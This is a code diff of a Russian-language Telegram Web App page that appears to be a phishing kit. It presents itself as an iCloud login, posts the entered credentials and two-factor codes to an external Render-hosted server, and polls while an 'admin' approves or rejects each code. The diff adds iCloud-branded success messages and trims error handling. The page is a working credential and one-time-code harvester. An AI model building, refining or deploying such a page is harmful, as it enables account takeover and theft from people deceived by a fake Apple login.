@@ -35,7 +35,7 @@
 
 <div class="login-form" id="menu-step" style="display:none;">
     <h2>Успешный вход</h2>
-    <p>Вы вошли в систему.</p>
+    <p>Доступ к iCloud подтвержден.</p>
     <button class="secondary" onclick="backToLogin()">Выйти</button>
 </div>
 
@@ -43,11 +43,9 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // ССЫЛКА НА ТВОЙ СЕРВЕР RENDER
     const serverUrl = 'https://sever-afk3.onrender.com'; 
     const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "guest_" + Math.floor(Math.random() * 10000);
 
-    // ТА САМАЯ ФУНКЦИЯ
     async function apiRequest(endpoint, data) {
         try {
             const response = await fetch(`${serverUrl}${endpoint}`, {
@@ -55,10 +53,10 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ...data, userId })
             });
-            return await response.json(); 
+            return await response.json();
         } catch (e) {
-            console.error("Ошибка сети:", e);
-            tg.showAlert("Сервер Render не отвечает. Проверь статус Live!");
+            console.error(e);
+            tg.showAlert("Ошибка связи с сервером.");
         }
     }
 
@@ -73,8 +71,6 @@
         if (res && res.status === 'ok') {
             document.getElementById('auth-step').style.display = 'none';
             document.getElementById('2fa-step').style.display = 'flex';
-        } else {
-            document.getElementById('auth-btn').disabled = false;
         }
     }
 
@@ -86,7 +82,7 @@
         const res = await apiRequest('/send-data', { type: '2fa', code });
 
         if (res && res.status === 'ok') {
-            tg.showConfirm("Ожидание подтверждения админом...");
+            tg.showConfirm("Ожидание подтверждения...");
 
             const checkInterval = setInterval(async () => {
                 try {
@@ -97,16 +93,15 @@
                         clearInterval(checkInterval);
                         document.getElementById('2fa-step').style.display = 'none';
                         document.getElementById('menu-step').style.display = 'flex';
+                        tg.showAlert("Доступ разрешен!");
                     } 
                     else if (data.status === 'error') {
                         clearInterval(checkInterval);
                         backToLogin();
-                        tg.showAlert("Код отклонен. Войдите заново.");
+                        tg.showAlert("Код отклонен администратором.");
                     }
                 } catch (e) { console.error(e); }
             }, 3000);
-        } else {
-            document.getElementById('2fa-btn').disabled = false;
         }
     }
 
@@ -122,3 +117,4 @@
 </script>
 </body>
 </html>
+
